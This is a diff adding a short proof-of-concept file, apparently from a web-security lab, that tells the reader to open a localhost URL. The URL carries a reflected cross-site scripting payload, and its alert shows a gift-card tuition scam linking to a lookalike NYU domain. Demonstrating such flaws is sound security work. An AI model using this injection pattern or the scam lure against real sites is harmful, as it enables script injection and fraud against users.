@@ -1,0 +1,3 @@
+Paste the following url into the web browser:
+
+http://127.0.0.1:8000/buy/6?director=%3Cscript%3Ealert('Do you know you can get a 5% discount on you tuition\nby paying with Apple gift card?\n\n  www.theNYU.edu/tuition')%3C/script%3E
